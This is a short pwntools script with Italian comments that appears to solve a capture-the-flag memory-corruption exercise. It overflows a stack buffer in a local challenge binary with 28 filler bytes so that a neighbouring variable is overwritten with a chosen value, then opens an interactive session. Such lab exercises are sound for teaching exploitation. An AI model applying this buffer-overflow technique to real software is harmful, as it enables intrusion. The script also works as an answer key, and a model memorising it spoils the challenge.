#!/usr/bin/python3
from pwn import *

'''
-- OBIETTIVO DEL PROGRAMMA --
Per risolvere la challenge è necessario rendere una variabile all'interno dello stack uguale a un valore,
per farlo bisogna calcolare la distanza tra il buffer e la variabile salvata nello stack (tramite gdb).
Una volta a conoscenza della distanza tra i due si invia un bytestream della lunghezza necessaria
a riempire il buffer e la restante memoria fino all'indirizzo della variabile, seguito dal valore che si vuole
inserire nella variabile nello stack. Sostanzialmente si fa overflow del buffer per sovrascrivere 
anche la variabile con un valore a scelta.
-----------------------------
'''

context.log_level = 'CRITICAL'

elf = ELF('/challenge/babymem-level-2-1')
p = elf.process()

delta_len = 28
value = p64(0x4d6f2689)
bytestream = b'A' * delta_len + value

p.sendline(f'{len(bytestream)}'.encode())
p.sendline(bytestream)
p.interactive()
